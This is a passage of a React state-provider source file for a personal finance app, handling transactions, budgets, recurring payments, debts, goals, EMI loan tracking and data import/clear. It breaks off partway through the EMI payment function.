219:       }
220:     }
221:     document.addEventListener('visibilitychange', handleVisibility)
222:     return () => document.removeEventListener('visibilitychange', handleVisibility)
223:   }, [])
224: 
225:   useEffect(() => { try { safeStorage.set(STORAGE_KEYS.SAVINGS, savingsGoal) } catch { /* silent */ } }, [savingsGoal])
226:   useEffect(() => { try { saveBudgets(budgets) } catch { /* silent */ } }, [budgets])
227:   useEffect(() => { try { saveRecurringTransactions(recurring) } catch { /* silent */ } }, [recurring])
228:   useEffect(() => { try { saveBudgetsV2(budgetsV2) } catch { /* silent */ } }, [budgetsV2])
229:   useEffect(() => { try { saveReceipts(receipts) } catch { /* silent */ } }, [receipts])
230:   useEffect(() => { try { saveWealthAssets(wealthAssets) } catch { /* silent */ } }, [wealthAssets])
231: 
232:   const isFirstMount = useRef(true)
233:   useEffect(() => {
234:     if (!isFirstMount.current) return
235:     isFirstMount.current = false
236:     const timer = setTimeout(() => {
237:       try {
238:         const normalized = recurring.map(normalizeRecurringItem)
239:         const today = new Date().toISOString().split('T')[0]
240:         const duplicateCheck = detectDuplicateGeneration(normalized, transactions)
241:         autoExecuteDueRecurring(normalized.filter((item) => {
242:           const dup = duplicateCheck.find((d) => d.recurring.id === item.id)
243:           return !(dup && dup.generatedToday)
244:         }), (item) => {
245:           const newTx = {
246:             type: item.type,
247:             amount: item.amount,
248:             category: item.category,
249:             note: item.note || '',
250:             date: today,
251:             tags: item.tags || [],
252:             source: item.source || 'recurring',
253:             id: generateId(),
254:             createdAt: Date.now(),
255:           }
256:           const nextDate = advanceNextDate(item.nextDate, item.frequency || 'monthly')
257:           setState((prev) => ({
258:             ...prev,
259:             transactions: [newTx, ...prev.transactions],
260:             recurring: prev.recurring.map((r) =>
261:               r.id === item.id
262:                 ? { ...r, nextDate, lastExecutedAt: Date.now(), updatedAt: Date.now() }
263:                 : r
264:             ),
265:           }))
266:         })
267:       } catch { /* silent */ }
268:     }, 1500)
269:     return () => clearTimeout(timer)
270:   }, [recurring, transactions])
271:   useEffect(() => { try { saveTags(tags) } catch { /* silent */ } }, [tags])
272:   useEffect(() => { try { saveSecuritySettings(security) } catch { /* silent */ } }, [security])
273:   useEffect(() => { try { saveDebts(debts) } catch { /* silent */ } }, [debts])
274:   useEffect(() => { try { saveGoals(goals) } catch { /* silent */ } }, [goals])
275:   useEffect(() => { try { saveTemplates(templates) } catch { /* silent */ } }, [templates])
276:   useEffect(() => { try { saveEmis(emis) } catch { /* silent */ } }, [emis])
277:   useEffect(() => { try { saveAccounts(accounts) } catch { /* silent */ } }, [accounts])
278:   useEffect(() => { try { saveDocuments(documents) } catch { /* silent */ } }, [documents])
279: 
280:   useEffect(() => {
281:     if (transactions.length < 3) return
282:     if (overspendTimer.current) clearTimeout(overspendTimer.current)
283:     overspendTimer.current = setTimeout(() => {
284:       try {
285:         const overspend = detectOverspending(transactions)
286:         if (overspend) setNotification(overspend)
287:       } catch { /* silent */ }
288:     }, 1000)
289:     return () => { if (overspendTimer.current) clearTimeout(overspendTimer.current) }
290:   }, [transactions])
291: 
292:   const recalcBudgetsV2 = useCallback((allTx) => {
293:     try {
294:       const updated = recalculateBudgetSpending(allTx || transactionsRef.current)
295:       setState((prev) => ({ ...prev, budgetsV2: updated }))
296:     } catch { /* silent */ }
297:   }, [])
298: 
299:   const addBudgetV2 = useCallback((data) => {
300:     const budget = createBudgetV2Util(data)
301:     setState((prev) => ({ ...prev, budgetsV2: [...prev.budgetsV2, budget] }))
302:     return budget
303:   }, [])
304: 
305:   const updateBudgetV2 = useCallback((id, updates) => {
306:     const updated = updateBudgetV2Util(id, updates)
307:     if (updated) {
308:       setState((prev) => ({
309:         ...prev,
310:         budgetsV2: prev.budgetsV2.map((b) => (b.id === id ? { ...b, ...updated } : b)),
311:       }))
312:     }
313:     return updated
314:   }, [])
315: 
316:   const deleteBudgetV2 = useCallback((id) => {
317:     deleteBudgetV2Util(id)
318:     setState((prev) => ({ ...prev, budgetsV2: prev.budgetsV2.filter((b) => b.id !== id) }))
319:   }, [])
320: 
321:   const archiveBudgetV2 = useCallback((id) => {
322:     const updated = archiveBudget(id)
323:     if (updated) {
324:       setState((prev) => ({
325:         ...prev,
326:         budgetsV2: prev.budgetsV2.map((b) => (b.id === id ? { ...b, ...updated } : b)),
327:       }))
328:     }
329:   }, [])
330: 
331:   const reactivateBudgetV2 = useCallback((id) => {
332:     const updated = reactivateBudget(id)
333:     if (updated) {
334:       setState((prev) => ({
335:         ...prev,
336:         budgetsV2: prev.budgetsV2.map((b) => (b.id === id ? { ...b, ...updated } : b)),
337:       }))
338:     }
339:   }, [])
340: 
341:   const addTransaction = useCallback((transaction) => {
342:     const newTx = {
343:       ...transaction,
344:       id: generateId(),
345:       date: transaction.date || new Date().toISOString().split('T')[0],
346:       createdAt: Date.now(),
347:     }
348:     const allTx = [newTx, ...transactionsRef.current]
349:     setState((prev) => ({ ...prev, transactions: [newTx, ...prev.transactions] }))
350: 
351:     if (transaction.type === 'expense' && transaction.category) {
352:       checkAndNotifyBudget(budgetsRef.current, allTx, transaction.category).catch(() => {})
353:     }
354: 
355:     if (transaction.type === 'expense') {
356:       recalcBudgetsV2(allTx)
357:     }
358: 
359:     checkStreakMilestone(allTx).catch(() => {})
360:     hapticLight()
361: 
362:     return newTx
363:   }, [recalcBudgetsV2])
364: 
365:   const deleteTransaction = useCallback((id) => {
366:     const deleted = transactionsRef.current.find((t) => t.id === id)
367:     setState((prev) => {
368:       const remaining = prev.transactions.filter((t) => t.id !== id)
369:       if (deleted && deleted.type === 'expense') {
370:         try {
371:           const updated = recalculateBudgetSpending(remaining)
372:           return { ...prev, transactions: remaining, budgetsV2: updated }
373:         } catch { /* silent */ }
374:       }
375:       return { ...prev, transactions: remaining }
376:     })
377:   }, [])
378: 
379:   const updateTransaction = useCallback((id, updates) => {
380:     setState((prev) => {
381:       const updated = prev.transactions.map((t) => (t.id === id ? { ...t, ...updates } : t))
382:       const oldTx = prev.transactions.find((t) => t.id === id)
383:       if ((oldTx?.type === 'expense' || updates?.type === 'expense') &&
384:           (updates?.amount !== undefined || updates?.category !== undefined)) {
385:         try {
386:           const recalc = recalculateBudgetSpending(updated)
387:           return { ...prev, transactions: updated, budgetsV2: recalc }
388:         } catch { /* silent */ }
389:       }
390:       return { ...prev, transactions: updated }
391:     })
392:   }, [])
393: 
394:   const getBalance = useCallback(() => {
395:     const income = transactions.filter((t) => t.type === 'income').reduce((sum, t) => sum + t.amount, 0)
396:     const expenses = transactions.filter((t) => t.type === 'expense').reduce((sum, t) => sum + t.amount, 0)
397:     return income - expenses
398:   }, [transactions])
399: 
400:   const getMonthlySummary = useCallback((year, month) => {
401:     const filtered = transactions.filter((t) => {
402:       const d = new Date(t.date)
403:       return d.getFullYear() === year && d.getMonth() === month
404:     })
405:     const income = filtered.filter((t) => t.type === 'income').reduce((sum, t) => sum + t.amount, 0)
406:     const expense = filtered.filter((t) => t.type === 'expense').reduce((sum, t) => sum + t.amount, 0)
407:     return { income, expense, balance: income - expense }
408:   }, [transactions])
409: 
410:   const getMonthlyData = useCallback(() => {
411:     const now = new Date()
412:     const months = []
413:     for (let i = 5; i >= 0; i--) {
414:       const d = new Date(now.getFullYear(), now.getMonth() - i, 1)
415:       const summary = getMonthlySummary(d.getFullYear(), d.getMonth())
416:       months.push({
417:         month: d.toLocaleString('en-US', { month: 'short' }),
418:         income: summary.income,
419:         expense: summary.expense,
420:       })
421:     }
422:     return months
423:   }, [getMonthlySummary])
424: 
425:   const updateSavings = useCallback((updates) => {
426:     setState((prev) => ({ ...prev, savingsGoal: { ...prev.savingsGoal, ...updates } }))
427:   }, [])
428: 
429:   const updateBudgets = useCallback((newBudgets) => {
430:     setState((prev) => ({ ...prev, budgets: newBudgets }))
431:   }, [])
432: 
433:   const updateBudgetLimit = useCallback((category, limit) => {
434:     setState((prev) => ({
435:       ...prev,
436:       budgets: {
437:         ...prev.budgets,
438:         [category]: { ...prev.budgets[category], limit, spent: prev.budgets[category]?.spent || 0 },
439:       },
440:     }))
441:   }, [])
442: 
443:   const addRecurring = useCallback((item) => {
444:     const newItem = { ...item, id: generateId(), createdAt: Date.now() }
445:     setState((prev) => ({ ...prev, recurring: [...prev.recurring, newItem] }))
446:     return newItem
447:   }, [])
448: 
449:   const updateRecurring = useCallback((id, updates) => {
450:     setState((prev) => ({
451:       ...prev,
452:       recurring: prev.recurring.map((r) =>
453:         r.id === id ? { ...r, ...updates, updatedAt: Date.now() } : r
454:       ),
455:     }))
456:   }, [])
457: 
458:   const toggleRecurring = useCallback((id) => {
459:     setState((prev) => ({
460:       ...prev,
461:       recurring: prev.recurring.map((r) =>
462:         r.id === id ? { ...r, active: !r.active, isActive: !(r.isActive ?? r.active ?? true), updatedAt: Date.now() } : r
463:       ),
464:     }))
465:   }, [])
466: 
467:   const removeRecurring = useCallback((id) => {
468:     setState((prev) => ({ ...prev, recurring: prev.recurring.filter((r) => r.id !== id) }))
469:   }, [])
470: 
471:   const executeRecurring = useCallback((recurringId) => {
472:     setState((prev) => {
473:       const item = prev.recurring.find((r) => r.id === recurringId)
474:       if (!item) return prev
475:       const newTx = {
476:         type: item.type,
477:         amount: item.amount,
478:         category: item.category,
479:         note: item.note || '',
480:         date: new Date().toISOString().split('T')[0],
481:         tags: item.tags || [],
482:         source: item.source,
483:         id: generateId(),
484:         createdAt: Date.now(),
485:       }
486:       return {
487:         ...prev,
488:         transactions: [newTx, ...prev.transactions],
489:         recurring: prev.recurring.map((r) =>
490:           r.id === recurringId
491:             ? { ...r, nextDate: advanceNextDate(r.nextDate, r.frequency), lastExecutedAt: Date.now() }
492:             : r
493:         ),
494:       }
495:     })
496:   }, [])
497: 
498:   const executeAllRecurring = useCallback(() => {
499:     hapticMedium()
500:     setState((prev) => {
501:       const due = getDueRecurringTransactions(prev.recurring)
502:       if (due.length === 0) return prev
503:       const now = new Date().toISOString().split('T')[0]
504:       const newTxs = due.map((item) => ({
505:         type: item.type,
506:         amount: item.amount,
507:         category: item.category,
508:         note: item.note || '',
509:         date: now,
510:         tags: item.tags || [],
511:         source: item.source,
512:         id: generateId(),
513:         createdAt: Date.now(),
514:       }))
515:       const dueIds = new Set(due.map((d) => d.id))
516:       return {
517:         ...prev,
518:         transactions: [...newTxs, ...prev.transactions],
519:         recurring: prev.recurring.map((r) =>
520:           dueIds.has(r.id)
521:             ? { ...r, nextDate: advanceNextDate(r.nextDate, r.frequency), lastExecutedAt: Date.now() }
522:             : r
523:         ),
524:       }
525:     })
526:   }, [])
527: 
528:   const skipRecurring = useCallback((recurringId) => {
529:     setState((prev) => ({
530:       ...prev,
531:       recurring: prev.recurring.map((r) =>
532:         r.id === recurringId
533:           ? { ...r, nextDate: advanceNextDate(r.nextDate, r.frequency), lastSkippedAt: Date.now() }
534:           : r
535:       ),
536:     }))
537:   }, [])
538: 
539:   const skipAllRecurring = useCallback(() => {
540:     setState((prev) => {
541:       const due = getDueRecurringTransactions(prev.recurring)
542:       if (due.length === 0) return prev
543:       const dueIds = new Set(due.map((d) => d.id))
544:       return {
545:         ...prev,
546:         recurring: prev.recurring.map((r) =>
547:           dueIds.has(r.id)
548:             ? { ...r, nextDate: advanceNextDate(r.nextDate, r.frequency), lastSkippedAt: Date.now() }
549:             : r
550:         ),
551:       }
552:     })
553:   }, [])
554: 
555:   const pauseRecurring = useCallback((id) => {
556:     setState((prev) => ({
557:       ...prev,
558:       recurring: prev.recurring.map((r) =>
559:         r.id === id
560:           ? { ...r, paused: true, pausedAt: Date.now(), updatedAt: Date.now() }
561:           : r
562:       ),
563:     }))
564:   }, [])
565: 
566:   const resumeRecurring = useCallback((id) => {
567:     setState((prev) => {
568:       const item = prev.recurring.find((r) => r.id === id)
569:       if (!item) return prev
570:       const nextDate = advanceNextDate(item.nextDate || item.startDate || new Date().toISOString().split('T')[0], item.frequency || 'monthly')
571:       return {
572:         ...prev,
573:         recurring: prev.recurring.map((r) =>
574:           r.id === id
575:             ? { ...r, paused: false, pausedAt: undefined, nextDate, updatedAt: Date.now() }
576:             : r
577:         ),
578:       }
579:     })
580:   }, [])
581: 
582:   const skipNextOccurrence = useCallback((id) => {
583:     setState((prev) => ({
584:       ...prev,
585:       recurring: prev.recurring.map((r) =>
586:         r.id === id
587:           ? { ...r, nextDate: advanceNextDate(r.nextDate, r.frequency || 'monthly'), lastSkippedAt: Date.now(), updatedAt: Date.now() }
588:           : r
589:       ),
590:     }))
591:   }, [])
592: 
593:   const editFutureOccurrences = useCallback((id, updates) => {
594:     const today = new Date().toISOString().split('T')[0]
595:     setState((prev) => {
596:       const updatedTransactions = prev.transactions.map((tx) => {
597:         if (tx.source === 'recurring' && tx.date >= today) {
598:           const txUpdates = {}
599:           if (updates.amount !== undefined) txUpdates.amount = updates.amount
600:           if (updates.category !== undefined) txUpdates.category = updates.category
601:           if (updates.note !== undefined) txUpdates.note = updates.note
602:           return Object.keys(txUpdates).length ? { ...tx, ...txUpdates } : tx
603:         }
604:         return tx
605:       })
606:       return {
607:         ...prev,
608:         transactions: updatedTransactions,
609:         recurring: prev.recurring.map((r) =>
610:           r.id === id
611:             ? { ...r, ...updates, updatedAt: Date.now() }
612:             : r
613:         ),
614:       }
615:     })
616:   }, [])
617: 
618:   const pendingRecurring = useMemo(() => getDueRecurringTransactions(recurring), [recurring])
619: 
620:   const addTag = useCallback((name) => {
621:     const trimmed = name.trim().toLowerCase()
622:     if (!trimmed) return
623:     setState((prev) => {
624:       if (prev.tags.find((t) => t.name === trimmed)) return prev
625:       return { ...prev, tags: [...prev.tags, { name: trimmed, id: generateId() }] }
626:     })
627:   }, [])
628: 
629:   const removeTag = useCallback((id) => {
630:     setState((prev) => ({ ...prev, tags: prev.tags.filter((t) => t.id !== id) }))
631:   }, [])
632: 
633:   const renameTag = useCallback((id, newName) => {
634:     const trimmed = newName.trim().toLowerCase()
635:     if (!trimmed) return
636:     setState((prev) => {
637:       if (prev.tags.find((t) => t.name === trimmed && t.id !== id)) return prev
638:       return {
639:         ...prev,
640:         tags: prev.tags.map((t) => (t.id === id ? { ...t, name: trimmed } : t)),
641:       }
642:     })
643:   }, [])
644: 
645:   const mergeTags = useCallback((sourceName, targetName) => {
646:     const s = sourceName.toLowerCase().trim()
647:     const t = targetName.toLowerCase().trim()
648:     if (!s || !t || s === t) return
649:     setState((prev) => ({
650:       ...prev,
651:       tags: prev.tags.filter((tag) => tag.name !== s),
652:       transactions: prev.transactions.map((tx) => {
653:         if (!tx.tags || !tx.tags.includes(s)) return tx
654:         const updated = tx.tags.map((tag) => (tag === s ? t : tag))
655:         const deduped = [...new Set(updated)]
656:         return { ...tx, tags: deduped }
657:       }),
658:     }))
659:   }, [])
660: 
661:   const updateSecurity = useCallback((updates) => {
662:     setState((prev) => ({ ...prev, security: { ...prev.security, ...updates } }))
663:   }, [])
664: 
665:   const addDebt = useCallback((data) => {
666:     const newDebt = createDebt(data)
667:     setState((prev) => ({ ...prev, debts: [newDebt, ...prev.debts] }))
668:     return newDebt
669:   }, [])
670: 
671:   const updateDebt = useCallback((id, updates) => {
672:     setState((prev) => ({
673:       ...prev,
674:       debts: prev.debts.map((d) => (d.id === id ? { ...d, ...updates } : d)),
675:     }))
676:   }, [])
677: 
678:   const deleteDebt = useCallback((id) => {
679:     setState((prev) => ({ ...prev, debts: prev.debts.filter((d) => d.id !== id) }))
680:   }, [])
681: 
682:   const recordRepayment = useCallback((id, repaymentAmount) => {
683:     setState((prev) => ({
684:       ...prev,
685:       debts: prev.debts.map((d) => (d.id === id ? applyRepayment(d, repaymentAmount) : d)),
686:     }))
687:   }, [])
688: 
689:   const addLedgerPayment = useCallback((ledgerId, amount, notes) => {
690:     const result = addPayment(ledgerId, amount, notes)
691:     if (result.success) {
692:       setState((prev) => ({
693:         ...prev,
694:         debts: prev.debts.map((d) => (d.id === ledgerId ? result.ledger : d)),
695:       }))
696:     }
697:     return result
698:   }, [])
699: 
700:   const undoLedgerPayment = useCallback((ledgerId) => {
701:     const result = undoLastPayment(ledgerId)
702:     if (result.success) {
703:       setState((prev) => ({
704:         ...prev,
705:         debts: prev.debts.map((d) => (d.id === ledgerId ? result.ledger : d)),
706:       }))
707:     }
708:     return result
709:   }, [])
710: 
711:   const editLedgerPayment = useCallback((ledgerId, paymentId, updates) => {
712:     const result = editPayment(ledgerId, paymentId, updates)
713:     if (result.success) {
714:       setState((prev) => ({
715:         ...prev,
716:         debts: prev.debts.map((d) => (d.id === ledgerId ? result.ledger : d)),
717:       }))
718:     }
719:     return result
720:   }, [])
721: 
722:   const deleteLedgerPayment = useCallback((ledgerId, paymentId) => {
723:     const result = deletePayment(ledgerId, paymentId)
724:     if (result.success) {
725:       setState((prev) => ({
726:         ...prev,
727:         debts: prev.debts.map((d) => (d.id === ledgerId ? result.ledger : d)),
728:       }))
729:     }
730:     return result
731:   }, [])
732: 
733:   const doSettleLedger = useCallback((ledgerId) => {
734:     const result = settleLedger(ledgerId)
735:     if (result.success) {
736:       setState((prev) => ({
737:         ...prev,
738:         debts: prev.debts.map((d) => (d.id === ledgerId ? result.ledger : d)),
739:       }))
740:     }
741:     return result
742:   }, [])
743: 
744:   const ledgerInsights = useMemo(() => {
745:     try { return getLedgerInsights(debts) } catch { return [] }
746:   }, [debts])
747: 
748:   const debtsSummary = useMemo(() => {
749:     try {
750:       const summary = getLedgerSummary(debts)
751:       const now = new Date()
752:       const overdueDebts = debts.filter(
753:         (d) => d.status === 'active' && d.currentBalance > 0 && d.dueDate && new Date(d.dueDate) < now
754:       )
755:       return { ...summary, overdueCount: overdueDebts.length, overdueDebts }
756:     } catch {
757:       const totalLent = debts.filter((d) => d.type === DEBT_TYPES.LENT).reduce((s, d) => s + (d.originalAmount || d.amount || 0), 0)
758:       const totalBorrowed = debts.filter((d) => d.type === DEBT_TYPES.BORROWED).reduce((s, d) => s + (d.originalAmount || d.amount || 0), 0)
759:       const pendingReceivables = debts
760:         .filter((d) => d.type === DEBT_TYPES.LENT && d.status !== 'settled' && d.status !== DEBT_STATUS.PAID)
761:         .reduce((s, d) => s + (d.currentBalance ?? d.remainingAmount ?? 0), 0)
762:       const pendingPayables = debts
763:         .filter((d) => d.type === DEBT_TYPES.BORROWED && d.status !== 'settled' && d.status !== DEBT_STATUS.PAID)
764:         .reduce((s, d) => s + (d.currentBalance ?? d.remainingAmount ?? 0), 0)
765:       const now = new Date()
766:       const overdueDebts = debts.filter(
767:         (d) => d.status !== 'settled' && d.status !== DEBT_STATUS.PAID && d.dueDate && new Date(d.dueDate) < now
768:       )
769:       return { totalLent, totalBorrowed, pendingReceivables, pendingPayables, overdueCount: overdueDebts.length, overdueDebts, totalActive: 0, totalSettled: 0 }
770:     }
771:   }, [debts])
772: 
773:   const clearAllData = useCallback(() => {
774:     snapshotBeforeClearAll()
775:     cancelAllEmiNotifications(emisRef.current).catch(() => {})
776:     safeStorage.clear()
777:     safeStorage.remove(STORAGE_KEYS.SCHEMA)
778:     privacy.clearPin()
779:     setState({
780:       transactions: [],
781:       savingsGoal: { target: 0, saved: 0 },
782:       budgets: {},
783:       budgetsV2: [],
784:       recurring: [],
785:       tags: [],
786:       security: { pinEnabled: false, pinCode: '', pinHash: '', biometricEnabled: false, privacyMode: false, hideBalance: false },
787:       debts: [],
788:       emis: [],
789:       goals: [],
790:       templates: [],
791:       documents: [],
792:       receipts: [],
793:       accounts: [],
794:       wealthAssets: [],
795:       _migrationResult: null,
796:       _recoverySnapshot: null,
797:     })
798:   }, [])
799: 
800:   const importData = useCallback((data) => {
801:     const txs = data.transactions ? sanitizeTransactions(data.transactions) : undefined
802:     const dts = data.debts ? sanitizeDebts(data.debts) : undefined
803:     const svg = data.savings || data.savingsGoal ? sanitizeSavingsGoal(data.savings || data.savingsGoal) : undefined
804:     const accts = data.accounts ? (Array.isArray(data.accounts) ? data.accounts : undefined) : undefined
805:     const wa = data.wealthAssets ? (Array.isArray(data.wealthAssets) ? data.wealthAssets : undefined) : undefined
806:     setState((prev) => ({
807:       ...prev,
808:       ...(txs ? { transactions: txs } : {}),
809:       ...(svg ? { savingsGoal: svg } : {}),
810:       ...(data.budgets ? { budgets: data.budgets } : {}),
811:       ...(data.recurring ? { recurring: data.recurring } : {}),
812:       ...(dts ? { debts: dts } : {}),
813:       ...(data.emis ? { emis: data.emis } : {}),
814:       ...(accts ? { accounts: accts } : {}),
815:       ...(wa ? { wealthAssets: wa } : {}),
816:       ...(Array.isArray(data.goals) ? { goals: data.goals } : {}),
817:       ...(Array.isArray(data.tags) ? { tags: data.tags } : {}),
818:       ...(Array.isArray(data.templates) ? { templates: data.templates } : {}),
819:       ...(Array.isArray(data.budgetsV2) ? { budgetsV2: data.budgetsV2 } : {}),
820:       ...(Array.isArray(data.receipts) ? { receipts: data.receipts } : {}),
821:       ...(Array.isArray(data.documents) ? { documents: data.documents } : {}),
822:     }))
823:     if (data.emis) {
824:       rescheduleAllEmiNotifications(data.emis).catch(() => {})
825:     }
826:   }, [])
827: 
828:   const restoreFromSnapshot = useCallback(() => {
829:     if (!recoverySnapshot) return
830:     const txs = sanitizeTransactions(recoverySnapshot.transactions || [])
831:     const svg = sanitizeSavingsGoal(recoverySnapshot.savingsGoal)
832:     setState((prev) => ({ ...prev, transactions: txs, savingsGoal: svg }))
833:     setRecoverySnapshot(null)
834:   }, [recoverySnapshot])
835: 
836:   const reloadFromStorage = useCallback(() => {
837:     const newState = loadInitialState()
838:     setState(newState)
839:     setRecoverySnapshot(newState._recoverySnapshot || null)
840:     rescheduleAllEmiNotifications(newState.emis).catch(() => {})
841:   }, [])
842: 
843:   const [debouncedInsights, setDebouncedInsights] = useState({
844:     score: { score: 0, level: 'N/A', factors: [] },
845:     scoreBreakdown: null,
846:     overspend: null, recommendations: [], habits: [], health: null,
847:     scoreHistory: [], scoreVelocity: null, streak: 0, monthPrediction: null, trends: [],
848:     smartInsights: [],
849:   })
850:   const insightsTimerRef = useRef(null)
851: 
852:   useEffect(() => {
853:     if (insightsTimerRef.current) clearTimeout(insightsTimerRef.current)
854:     insightsTimerRef.current = setTimeout(() => {
855:       const txLen = transactions.length
856:       if (txLen < 3) {
857:         setDebouncedInsights({
858:           score: { score: 0, level: 'N/A', factors: [] },
859:           overspend: null, recommendations: [], habits: [], health: null,
860:           scoreHistory: [], scoreVelocity: null, streak: 0, monthPrediction: null, trends: [],
861:           smartInsights: [],
862:         })
863:         return
864:       }
865:       try {
866:         setDebouncedInsights({
867:           score: calculateFinancialScore(transactions),
868:           scoreBreakdown: getScoreBreakdown(transactions),
869:           overspend: detectOverspending(transactions),
870:           recommendations: getSavingsRecommendations(transactions, savingsGoal),
871:           habits: getHabitInsights(transactions),
872:           health: getFinancialHealth(transactions),
873:           scoreHistory: getMonthlyScoreHistory(transactions, 6),
874:           scoreVelocity: getScoreVelocity(transactions),
875:           streak: getLoggingStreak(transactions),
876:           monthPrediction: predictMonthEndSpend(transactions),
877:           trends: getCategoryTrends(transactions, 3),
878:           smartInsights: generateSmartInsights(transactions, budgetsRef.current, debts),
879:         })
880:       } catch {
881:         setDebouncedInsights({
882:           score: { score: 0, level: 'N/A', factors: [] },
883:           scoreBreakdown: null,
884:           overspend: null, recommendations: [], habits: [], health: null,
885:           scoreHistory: [], scoreVelocity: null, streak: 0, monthPrediction: null, trends: [],
886:           smartInsights: [],
887:         })
888:       }
889:     }, 400)
890:     return () => { if (insightsTimerRef.current) clearTimeout(insightsTimerRef.current) }
891:   }, [transactions, savingsGoal, debts])
892: 
893:   const insights = debouncedInsights
894: 
895:   const transactionIndex = useMemo(() => {
896:     try { return buildIndexes(transactions) } catch { return { byId: {}, byDate: {}, byCategory: {}, byType: {}, byPerson: new Map() } }
897:   }, [transactions])
898: 
899:   const cashflowForecast = useMemo(() => {
900:     try { return getCashflowForecast(recurring, 3) } catch { return [] }
901:   }, [recurring])
902: 
903:   const goalsProjections = useMemo(() => {
904:     return goals.map((g) => ({ ...g, projection: getGoalProjection(g) }))
905:   }, [goals])
906: 
907:   const updateAccounts = useCallback((newAccounts) => {
908:     setState((prev) => ({ ...prev, accounts: newAccounts }))
909:   }, [])
910: 
911:   const addGoal = useCallback((data) => {
912:     const goal = createGoal(data)
913:     const goals = getGoals()
914:     setState((prev) => ({ ...prev, goals }))
915:     return goal
916:   }, [])
917: 
918:   const editGoal = useCallback((id, updates) => {
919:     updateGoal(id, updates)
920:     const goals = getGoals()
921:     setState((prev) => ({ ...prev, goals }))
922:   }, [])
923: 
924:   const removeGoal = useCallback((id) => {
925:     deleteGoal(id)
926:     const goals = getGoals()
927:     setState((prev) => ({ ...prev, goals }))
928:   }, [])
929: 
930:   const addTemplate = useCallback((tx) => {
931:     createTemplate(tx)
932:     setState((prev) => ({ ...prev, templates: getTemplates() }))
933:   }, [])
934: 
935:   const removeTemplate = useCallback((id) => {
936:     deleteTemplate(id)
937:     setState((prev) => ({ ...prev, templates: getTemplates() }))
938:   }, [])
939: 
940:   const recentTemplates = useMemo(
941:     () => [...templates].sort((a, b) => (b.uses || 0) - (a.uses || 0)).slice(0, 5),
942:     [templates]
943:   )
944: 
945:   const addEmi = useCallback((data) => {
946:     const newEmi = createEmi(data)
947:     setState((prev) => ({ ...prev, emis: [newEmi, ...prev.emis] }))
948:     scheduleEmiNotifications(newEmi).catch(() => {})
949:     return newEmi
950:   }, [])
951: 
952:   const updateEmi = useCallback((id, updates) => {
953:     const oldEmi = emisRef.current.find((e) => e.id === id)
954:     if (!oldEmi) return
955:     setState((prev) => ({
956:       ...prev,
957:       emis: prev.emis.map((e) =>
958:         e.id === id ? { ...e, ...updates, updatedAt: Date.now() } : e
959:       ),
960:     }))
961:     cancelEmiNotifications(id).catch(() => {})
962:     const merged = { ...oldEmi, ...updates }
963:     if (merged.status === EMI_STATUS.ACTIVE && (merged.remainingMonths || 0) > 0) {
964:       scheduleEmiNotifications(merged).catch(() => {})
965:     }
966:   }, [])
967: 
968:   const deleteEmi = useCallback((id) => {
969:     setState((prev) => ({ ...prev, emis: prev.emis.filter((e) => e.id !== id) }))
970:     cancelEmiNotifications(id).catch(() => {})
971:   }, [])
972: 
973:   const closeEmi = useCallback((id) => {
974:     setState((prev) => ({
975:       ...prev,
976:       emis: prev.emis.map((e) =>
977:         e.id === id ? { ...e, status: EMI_STATUS.CLOSED, remainingAmount: 0, remainingMonths: 0, updatedAt: Date.now() } : e
978:       ),
979:     }))
980:     cancelEmiNotifications(id).catch(() => {})
981:   }, [])
982: 
983:   const reopenEmi = useCallback((id) => {
984:     let updatedEmi = null
985:     setState((prev) => {
986:       const emi = prev.emis.find((e) => e.id === id)
987:       if (!emi || emi.status !== EMI_STATUS.CLOSED) return prev
988:       const originalRemaining = (emi.principalAmount ?? emi.amount ?? 0) - (emi.totalPaid || 0)
989:       const originalRemainingMonths = (emi.tenureMonths || 0) - (emi.totalPaidCount || 0)
990:       updatedEmi = {
991:         ...emi,
992:         status: EMI_STATUS.ACTIVE,
993:         remainingAmount: Math.max(0, originalRemaining),
994:         remainingMonths: Math.max(0, originalRemainingMonths),
995:         updatedAt: Date.now(),
996:       }
997:       return { ...prev, emis: prev.emis.map((e) => (e.id === id ? updatedEmi : e)) }
998:     })
999:     if (updatedEmi) scheduleEmiNotifications(updatedEmi).catch(() => {})
1000:   }, [])
1001: 
1002:   const pauseEmi = useCallback((id) => {
1003:     setState((prev) => ({
1004:       ...prev,
1005:       emis: prev.emis.map((e) =>
1006:         e.id === id
1007:           ? { ...e, status: EMI_STATUS.PAUSED, updatedAt: Date.now() }
1008:           : e
1009:       ),
1010:     }))
1011:     cancelEmiNotifications(id).catch(() => {})
1012:   }, [])
1013: 
1014:   const resumeEmi = useCallback((id) => {
1015:     let updatedEmi = null
1016:     setState((prev) => {
1017:       const emi = prev.emis.find((e) => e.id === id)
1018:       if (!emi) return prev
1019:       updatedEmi = { ...emi, status: EMI_STATUS.ACTIVE, updatedAt: Date.now() }
1020:       return {
1021:         ...prev,
1022:         emis: prev.emis.map((e) =>
1023:           e.id === id ? updatedEmi : e
1024:         ),
1025:       }
1026:     })
1027:     if (updatedEmi) {
1028:       scheduleEmiNotifications(updatedEmi).catch(() => {})
1029:     }
1030:   }, [])
1031: 
1032:   const markEmiPaid = useCallback((emiId) => {
1033:     setState((prev) => {
1034:       const emi = prev.emis.find((e) => e.id === emiId)
1035:       if (!emi) return prev
1036: 
1037:       const today = new Date().toISOString().split('T')[0]
1038:       const emiAmount = emi.emiAmount || emi.amount || 0
1039:       const emiName = emi.loanName || emi.name || ''
1040:       const emiLender = emi.lenderName || emi.lender || ''
1041: 
1042:       const newTx = {
1043:         type: 'expense',
1044:         amount: emiAmount,
1045:         category: 'emi',
1046:         note: `EMI: ${emiName}${emiLender ? ` - ${emiLender}` : ''}`,
1047:         date: today,
1048:         tags: ['emi'],
1049:         source: emiLender || undefined,
1050:         id: generateId(),
1051:         createdAt: Date.now(),
1052:       }
1053: 
1054:       const paymentRecord = {
1055:         id: generateId(),
1056:         paymentId: generateId(),
1057:         emiId,
1058:         date: today,
1059:         paymentDate: today,
1060:         amount: emiAmount,
1061:         transactionId: newTx.id,
1062:         paidAt: Date.now(),
1063:         notes: `EMI payment for ${emiName}`,
1064:         principal: Math.min(emiAmount, emi.remainingAmount || 0),
1065:         interest: 0,
1066:         extraAmount: 0,
1067:         timestamp: Date.now(),
1068:       }
1069: 
1070:       const principalPaid = Math.min(emiAmount, emi.remainingAmount || 0)
1071:       const currentRemainingMonths = emi.remainingMonths !== undefined ? emi.remainingMonths : (emi.tenureMonths || 0)
1072:       const newRemainingMonths = Math.max(0, currentRemainingMonths - 1)
1073:       const newRemainingAmount = Math.max(0, (emi.remainingAmount || 0) - principalPaid)
